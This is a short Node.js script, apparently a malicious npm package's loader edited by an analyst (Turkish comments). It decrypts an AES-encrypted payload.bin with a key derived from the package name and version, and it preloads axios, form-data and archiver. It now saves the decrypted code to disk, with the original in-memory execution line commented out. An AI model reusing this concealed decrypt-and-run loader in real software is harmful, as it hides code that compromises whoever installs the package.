var _p = require("path");
var _f = require("fs");
var _c = require("crypto");
var _M = require("module");
try {
  require("axios");
} catch (_) {}
try {
  require("form-data");
} catch (_) {}
try {
  require("archiver");
} catch (_) {}
var _pkg = JSON.parse(_f.readFileSync(_p.join(__dirname, "package.json"), "utf8"));
var _k = _c.createHash("sha256").update(_pkg.name + ":" + _pkg.version).digest();
var _b = _f.readFileSync(_p.join(__dirname, "payload.bin"));
var _d = _c.createDecipheriv("aes-256-gcm", _k, _b.slice(0, 12));
_d.setAuthTag(_b.slice(12, 28));
var _s = _d.update(_b.slice(28), null, "utf8") + _d.final("utf8");
// Çalıştırmak yerine dosyaya kaydet:
_f.writeFileSync(_p.join(__dirname, "decrypted_payload.js"), _s, "utf8");
console.log("Payload kaydedildi: decrypted_payload.js");
// Eski satırı silin:
// new _M(module.filename, module)._compile(_s, _p.join(__dirname, "app.js"));
